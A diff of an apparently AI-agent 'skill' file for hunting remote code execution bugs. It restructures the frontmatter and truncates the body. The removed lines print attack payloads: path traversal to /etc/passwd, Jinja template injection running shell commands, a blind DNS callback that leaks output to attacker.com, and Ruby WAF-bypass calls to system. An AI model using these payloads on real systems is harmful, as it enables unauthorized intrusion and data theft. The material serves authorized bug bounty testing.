@@ -2,19 +2,20 @@
 name: hunt-rce
 description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty
   reports. Use when hunting rce on any target.
-category: security
-risk: offensive
-source: https://github.com/elementalsouls/Claude-BugHunter
-source_repo: elementalsouls/Claude-BugHunter
-source_type: community
-date_added: '2026-09-20'
 license: MIT
-license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
 compatibility: Requires explicit written authorization for a target scope plus the
   relevant testing tools for this technique. Docs-only; helper scripts and commands
   not bundled.
-sources: github, hackerone_public
-report_count: 87
+metadata:
+  category: security
+  risk: offensive
+  source: https://github.com/elementalsouls/Claude-BugHunter
+  source_repo: elementalsouls/Claude-BugHunter
+  source_type: community
+  date_added: '2026-09-20'
+  license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
+  sources: github, hackerone_public
+  report_count: '87'
 ---
 > **⚠️ AUTHORIZED USE ONLY**
 > This skill is for educational purposes or authorized security assessments only.
@@ -393,52 +394,5 @@ data:text/html,<script>alert(1)</script>
 # Unicode normalization
 ..%c0%af  (overlong UTF-8)
 # Null byte (older systems)
-../../etc/passwd%00.jpg
-```
 
-### Bypass: Template injection with output filtering
-```
-# If {{ }} is sanitized on output but not evaluation:
-{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
-# Blind — use DNS callback instead of output
-{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
-```
-
-### Bypass: WAF blocking `exec`, `system`, `popen`
-```ruby
-# Ruby
-send(:system, "id")
-method(:exec).call("id")
-Kernel.send(:`, "id")
-Object.const_get(:Kernel).system("id")
-```
-
----
-
-
-## Contents
-
-- [Gate 0 Validation](references/details.md)
-- [Real Impact Examples](references/details.md)
-- [Chains & Compositions (Senior Hunting)](references/details.md)
-- [Related Skills & Chains](references/details.md)
-
-## When to Use
-
-- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
-
-## Limitations
-
-- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
-- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
-- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.
-
-### Example
-
-```bash
-# Read-only first step; confirm scope before anything active.
-cat scope.txt  # target list from the authorized engagement brief
-```
-
-> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+<!-- Truncated for OpenGAP token limits -->
